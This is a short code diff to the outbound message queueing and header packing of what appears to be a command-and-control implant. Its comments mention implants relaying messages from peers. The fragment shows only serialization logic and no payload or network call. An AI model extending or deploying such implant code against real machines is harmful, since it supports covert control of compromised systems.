@@ -88,8 +88,6 @@ namespace Message {
             QueueSegments(B_PTR(Outbound->Buffer), Outbound->Length);
 
         } else {
-            OutboundQueue(Outbound);
-            /*
             Parser::CreateParser(&Parser, B_PTR(Outbound->Buffer), Outbound->Length);
             Queue = Stream::CreateStream();
 
@@ -105,7 +103,6 @@ namespace Message {
 
             Parser::DestroyParser(&Parser);
             Stream::DestroyStream(Outbound);
-             */
         }
 
         defer:
@@ -164,6 +161,8 @@ namespace Message {
             Stream::PackDword(Outbound, TypeTasking);
 
         } else {
+            // Implants that receive messages from peers must parse the header themselves.
+            // Pid, Tid and Type need to be saved and the remaining buffer can be re-packaged with a new header
 
             Outbound = Stream::CreateStream();
             Head = Ctx->Transport.OutboundQueue;
@@ -175,11 +174,10 @@ namespace Message {
 
                 if (Head->Buffer) {
                     Parser::CreateParser(&Parser, B_PTR(Head->Buffer), Head->Length);
-                    // XteaCrypt(Parser->Buffer + 4);
 
-                    Stream::PackDword(Outbound, Parser::UnpackDword(&Parser));
-                    Stream::PackDword(Outbound, Parser::UnpackDword(&Parser));
-                    Stream::PackDword(Outbound, Parser::UnpackDword(&Parser));
+                    Stream::PackDword(Outbound, Head->PeerId);
+                    Stream::PackDword(Outbound, Head->TaskId);
+                    Stream::PackDword(Outbound, Head->MsgType);
 
                     if (Ctx->Root) {
                         Stream::PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
@@ -191,9 +189,7 @@ namespace Message {
                         Outbound->Length += Head->Length;
                     }
 
-                    Parser::DestroyParser(&Parser);
                     Head->Ready = TRUE;
-
                 } else {
                     return_defer(ERROR_NO_DATA);
                 }
